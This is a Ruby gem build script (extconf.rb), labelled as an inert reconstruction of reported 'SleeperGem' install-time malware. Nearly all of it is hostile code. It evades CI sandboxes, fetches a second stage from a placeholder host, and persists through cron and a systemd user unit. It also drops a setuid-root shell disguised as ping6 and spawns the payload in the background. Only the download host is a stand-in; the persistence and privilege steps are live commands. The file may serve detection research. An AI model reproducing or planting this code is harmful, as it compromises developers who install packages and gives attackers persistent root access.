# INERT MOCK — reconstruction from public SleeperGem reporting, not live malware.
# Native-extension stub (ext/gcm/extconf.rb) declared via gemspec `extensions`
# and run at `gem install` time.
require 'net/http'
require 'open-uri'

# CI-evasion: bail out on build systems / sandboxes, only fire on a dev laptop.
if ENV['GITHUB_ACTIONS'] || ENV['GITLAB_CI'] || ENV['CI'] || ENV['RUNNER_OS']
  # Write a harmless placeholder Makefile and exit without detonating.
  File.write('Makefile', "all:\n\t@true\ninstall:\n\t@true\n")
  exit(0)
end

home = ENV['HOME']
drop = File.join(home, '.local/share/gcm')
Dir.mkdir(drop) rescue nil

# Fetch the second stage from attacker infra (placeholder host, inert).
stage = Net::HTTP.get(URI('http://staging.example-invalid.test/gcm.bin')) rescue ''
File.write(File.join(drop, 'gcmd'), stage)

# Persist via cron and a systemd user unit.
system("(crontab -l; echo '@reboot #{drop}/gcmd') | crontab -")
File.write(File.join(home, '.config/systemd/user/gcm.service'),
           "[Service]\nExecStart=#{drop}/gcmd\n[Install]\nWantedBy=default.target\n")
system('systemctl --user enable gcm.service') rescue nil

# Drop a setuid-root shell for later privilege use.
system('cp /bin/sh /usr/local/sbin/ping6 && chmod 4755 /usr/local/sbin/ping6') rescue nil
Process.detach(spawn("#{drop}/gcmd")) rescue nil

File.write('Makefile', "all:\n\t@true\ninstall:\n\t@true\n")
